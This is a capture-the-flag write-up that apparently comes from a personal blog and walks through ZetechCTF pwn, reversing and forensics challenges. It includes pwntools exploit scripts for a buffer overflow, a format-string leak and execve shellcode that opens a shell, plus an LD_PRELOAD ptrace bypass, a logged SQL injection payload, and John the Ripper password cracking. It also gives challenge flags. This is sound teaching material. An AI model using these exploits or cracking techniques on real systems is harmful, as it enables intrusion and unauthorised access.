---
title: "ZetechCTF"
date: 2025-03-23
layout: "simple"
categories: [Binary exploitation]
tags: [ZetechCTF]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
excerpt: "Some challenges I created"
---

## PWN


### Namelen

This challenge was an easy buffer overflow where you had to fill the buffer with a specific set of characters.

Using Ghidra we can actually get to see this.

![Ghidra](https://gist.github.com/user-attachments/assets/29df06d2-4484-4529-ae0c-9a61265d7ef1)

We do get to see that the main function calls another function called `bufcheck()`

![BufferCheck](https://gist.github.com/user-attachments/assets/ec35ae47-de39-46bf-8134-e75afca84a9f)

Analyzing this function we see that there is an if function. The if function firs checks if `sVar1 = 0x14`. It also checks if the characters are `i` . When both this conditions are met, then the `flagfunc()` is called.

![image](https://gist.github.com/user-attachments/assets/4dd91a17-774f-4bdd-bcdd-00fa827c6952)

This function will ideally get us the flag.

To craft the solution we can use python3 to print us this characters and pass them through the binary.

Our solution should be simple enough.

```python
from pwn import *

#p = process("./namelen")
p = remote("84.8.139.90", 9003)
buffer = b"i" * 0x14

p.sendline(buffer)

p.recvline()

flag = p.recvS().strip()
print(flag)
```

![image](https://gist.github.com/user-attachments/assets/ccdca851-cacb-4234-9fe5-6f1b227aa9e6)


Sure enough we do get our flag as:

`ZUCTF{L0ng35t_n4m3_t0_3v3r_3x15t}`

### FMT

The next challenge was based on a format string vulnerability where you could read memory values using `%p` Let us see how this arises in ghidra

![image](https://gist.github.com/user-attachments/assets/9ae9eeef-5bd6-4e63-939a-1ffaab2b3428)

So we do see that there is a `printf()` function that has not been really sanitized. And to test for this we could send `%p`  to the binary and see what is printed back to us.

![image](https://gist.github.com/user-attachments/assets/7da385af-6d81-4314-b16d-2c2e93f9bccf)

Sure enough we do see some things being printed back to us. Also when analyzing the binary in ghidra we do see that the flag contents are saved on the stack as a variable `local_10 = fopen("flag.txt", "r"`

Now this narrows down our means to get the flag as we can use `%lx` to print values from the stack as hex. Then decode whatever is printed back to us.

By sending a lot of this to the binary we do get some values back

![image](https://gist.github.com/user-attachments/assets/bb403ffb-57a8-4764-ae7a-95e35f3a7c00)

Yeah this is a lot but to basically explain, in between will be repeated values since this is our input `%lx` a bunch of times. After this repeated values is what we would ideally be interested in.
Now I created a flag locally to test this, and put the contents `fake flag` inside. Looking through all this addresses but we do get a good hit on this value `616c6620656b6166`

![image](https://gist.github.com/user-attachments/assets/2dd86e3f-c7a9-4536-a29d-353ceeea8b53)

Nice we get the string `fake flag` even though it seems in reverse. But now we need to know the number in which this address will be from. So our payload would look something like `%{n}$lx` with `n` being the number where the value leaks. In our case this was `136`.

With this information we can craft a solution that we would use on remote. Now here the flag is longer so we need to leak `136` and `137` values from the stack.

```python
from pwn import *

# p = process("./fmt")
p = remote("84.8.139.90", 9004)

p.sendline(b"%136$lx.%137$lx")

p.recvuntil(b"Here: ")
leak = p.recvlineS().split(".")
var_1 = leak[0]
var_2 = leak[1]

print(var_1, var_2)

flag = bytearray.fromhex(var_1).decode()[::-1]
flag += bytearray.fromhex(var_2).decode()[::-1]

print(flag)

p.interactive()
```

Sure enough this gets us the flag.


![image](https://gist.github.com/user-attachments/assets/75aabf63-0ee7-479f-abd5-353392b5e0b3)

`ZUCTF{fmt_5tr1ng}`

### Ret2Shellcode

This challenge involved the binary leaking an address for and all you had to do was write shellcode into this buffer location to pop a shell. We can view this in ghidra where we see that `printf()` leaks the address for us by default.

![image](https://gist.github.com/user-attachments/assets/70eec53a-bca6-4ca0-86db-628d626e0193)

To confirm that the stack is executable we can use `checksec` to check for file securities.

![image](https://gist.github.com/user-attachments/assets/b16539be-e5b3-442d-974c-d1102415d301)


This means that the stack is executable and we can run shellcode on the stack. For this we are going to use [shellstorm](http://shell-storm.org/shellcode/files/shellcode-603.html) , which is a database for shellcodes performing different functions.

Now with this we can go on to craft our payload.

```python
from pwn import *

binary = context.binary = ELF("./chal", checksec=False)
#p = process()

p = remote("84.8.139.90", 9003)
p.recvuntil("Your buffer sits at: ")
leak = int(p.recvline(), 16)

log.info("Leak: %#x", leak)

sc = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

payload = sc
payload += b'a' * (88 - len(sc))
payload += p64(leak)


p.sendline(payload)

p.interactive()
```

Let us break down this solution at least. Now to start, we grab the address that has been leaked to us using `p.recvline()` . Then we can craft our shellcode as above. Next we need to find the value where we can overflow the buffer so that we can gain control of execution. We can use `pwndbg` for this.
![image](https://gist.github.com/user-attachments/assets/b9376611-bba8-4be9-9d32-f4858ec70a19)

Now we see that `0x50` is set aside. Now we can calculate this value in decimal using `python`

It is usually safer to add `8` for `64 bit` binaries and `4`  for `32` bit binaries. I don't know why but it usually works magic for me. and that is how we get `88` Next would be adding the address that we leaked as the buffer location.

To help with this challenge you can refer to [pwn104](https://w-47.github.io/blog/posts/thm/binary104/) .

## REV

### Stitched

In this challenge you had to read the value of the flag from memory. Well ghidra here cannot really help us, since the main function appears blank. 

![image](https://gist.github.com/user-attachments/assets/341e7e5b-708d-40d9-8566-92b6dfcaa9e4)

Rather we can check `pwndbg` which ideally holds more information for us

![image](https://gist.github.com/user-attachments/assets/b2c36fa1-a94d-400d-848f-12b4f62206f1)

From this we can see that `main` calls `<flag>` as a pointer to the encoded flag in memory with. Using `pwndbg` we can analyze this using `x/8gx 0x4040` 
![image](https://gist.github.com/user-attachments/assets/ada3f68b-5e05-4537-a253-5cb33b315132)

Nice we do get some values from it, maybe now we can come up with a way to decode this. With the help of ChatGPT we can come up with this. 

```python
flag_data = [
    0x72D52BFE,
    0x72D963CB,
    0x730405E6,
    0x61399B32,
    0x603CD2F9,
    0x6727DE01,
    0x5E48C8C4,
    0x7BF80FE2,
]

flag = ""

for num in flag_data:
    while num > 0:
        flag += chr(num % 0xFF)  # Extract least significant byte
        num //= 0xFF  # Remove extracted byte

print("Decoded flag:", flag)
```

Sure enough this gets our flag. 

![image](https://gist.github.com/user-attachments/assets/09e9ab52-5775-49c1-a1a8-5e8331c98e6b)


`r00t{p4tch_th3_bin_and_h4ve_fun}`

Another way to solve this, you can read this writeup by [D_captain](https://d-c4ptain.github.io/posts/P3rf3ctr00t-CTF-2024/#rev) 

### Forked illusions

Now for this challenge, well you could have done strings and gotten the flag. No seriously. But this challenge actually takes us to a route called bypassing `ptrace` using `LD_PRELOAD` 

Now running this binary we do get a fault with the message `Debugging attempt detected` 

![image](https://gist.github.com/user-attachments/assets/51872485-75e7-4ce0-8d53-c22084f42533)

In ghidra we can try and unmangle this binary further starting from the main function. 

![image](https://gist.github.com/user-attachments/assets/3fd56b0a-3bd2-4ed7-9aff-ee5b2fc3becb)

We see that it is going to require a `licence key` of some sort. But first this binary uses `ptrace` to see the process running, the binary exits with the message we saw earlier. 

![image](https://gist.github.com/user-attachments/assets/71a79fa2-bd51-4c9e-b3d1-a634e31ffd32)

We could check the manual for `ptrace` to understand further what it is. [ptrace manual](https://man7.org/linux/man-pages/man2/ptrace.2.html) 
Now to bypass this we would have to control the loading path of the shared library, this will allow us to remove any library functions being called by the binary that includes `ptrace`

```c
long ptrace(int request, int pid, void *addr, void *data) {
    return 0;
}
```

Our bypass would be as simple as that. Next we would compile it with the tag `-shared` and the output as `.so`

```shell
gcc -shared bypass.c -o bypass.so
```

Running with the environment variable `LD_PRELOAD` we can now see that we do not get the error from before. 

![image](https://gist.github.com/user-attachments/assets/ad08b97f-b890-44a3-92e5-0c123b0e8fd0)

Back to ghidra we see this function that compares the string `Juice wrld`

![image](https://gist.github.com/user-attachments/assets/682963ed-6b3d-4eff-af17-4d34eacc2e7d)

Now I believed this is our license key right, but for some reason this did not work. Not until I saw another function in ghidra. This function printed out the flag. 

![image](https://gist.github.com/user-attachments/assets/e5c431cd-8042-4aea-a94f-203552111faa)

This function was peculiar as it was being called right before the flag is printed. And seeing the `param_1` made me know that somehow the license key we found was somewhat part of the flag. And it was, I will never forgive the creator for this lol. But anyway we did learn about bypassing `ptrace`  

`ZUCTF{Juice wrld}`

## Forensics 

### Loggy

For this challenge we are provided with some logs and are required to get the flag from it. Now lucky guess is the flag is encoded somewhere in the logs. 

![image](https://gist.github.com/user-attachments/assets/04258d7e-fea7-44fe-b2f9-4c039ef7e56e)

This particular log stood out as it had some encoding going on 
```
192.168.32.1 - - [29/Sep/2015:03:37:34 -0400] "GET /mutillidae/index.php?page=user-info.php&username=%27+union+all+select+1%2CString.fromCharCode%28102%2C+108%2C+97%2C+103%2C+32%2C+105%2C+115%2C+32%2C+83%2C+81%2C+76%2C+95%2C+73%2C+110%2C+106%2C+101%2C+99%2C+116%2C+105%2C+111%2C+110%29%2C3+--%2B&password=&user-info-php-submit-button=View+Account+Details HTTP/1.1" 200 9582 "http://192.168.32.134/mutillidae/index.php?page=user-info.php&username=something&password=&user-info-php-submit-button=View+Account+Details" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
```

We can use `URL decode` to make this a lot more cleaner.

![image](https://gist.github.com/user-attachments/assets/4e2779eb-3d74-4d51-a01a-dafa5aa9d5e8)

We can take the values that come from `String.fromCharCode` and try and make of what it is

Now we can try and decode using python and chatgpt 

```python 
def decode_char_codes(char_codes):
    return ''.join(chr(code) for code in char_codes)

# Example usage
char_codes = [102, 108, 97, 103, 32, 105, 115, 32, 83, 81, 76, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110]
decoded_string = decode_char_codes(char_codes)
print(decoded_string)
```

Sure enough it will get us our flag.

```shell
loggy ➤ python3 decode.py                                                                                                                     
flag is SQL_Injection
```

`ZUCTF{SQL_INnjection}`

### Crack me if you can

In this challenge we are provided with a excel document that has been password protected. And our task is cracking the password and being able to view the contents of the document.

![image](https://gist.github.com/user-attachments/assets/ebb684dc-7324-4f4e-b13d-6fe0add7efed)


We could use a neat tool `office2john` that is used to extract password hashes from Microsoft office documents. It is a part of the `John the Ripper` suite. 

![image](https://gist.github.com/user-attachments/assets/0eba7cf0-5060-4521-84d2-30885f561959)

After we have a hash we can go ahead and use `John` to crack this password. 

```shell
john hash -w=/usr/share/wordlists/rockyou.txt
```

![image](https://gist.github.com/user-attachments/assets/76348c58-b1d7-4f69-aba5-5549586f7155)

And we get our password as `password123`.

Using the password we can get the flag as 

`ZUCTF{0ff1c3_t0_j0hn_4_th3_w1n!!!}`

### Unknown Archive

For this challenge we are provided with an image that we can use `FTK imager` to see the contents of this image. 

![image](https://gist.github.com/user-attachments/assets/58c15666-0b6d-447e-b2f1-5e12bd98c4ef)

We do see that we have a `chall.zip` . We would need to extract this zip file from the image for further analysis. Since this is the furthest we can go with `FTK`.

Now similar to the previous challenge this time we can use `zip2john` it also belongs to the `John` suite but works on `zip` files

![image](https://gist.github.com/user-attachments/assets/a9364515-616d-4d1d-a1e9-8d2efb73fbc1)

With this we can see that our password is `raven` so we can try and unzip this file using `7zip` because this will require a password

```shell
7z x chall.zip
```

We can go ahead and open the image with the flag 

![image](https://gist.github.com/user-attachments/assets/03e05946-f428-4d23-87ec-8525d6f42e85)


`ZUCTF{Ad1_V1su4l_4n0m4ly}`

## Conclusion

I really enjoyed this challenges and solving them and cheers to [Fr334aks-mini](https://www.linkedin.com/company/83010158/) for creating nice challenges. 
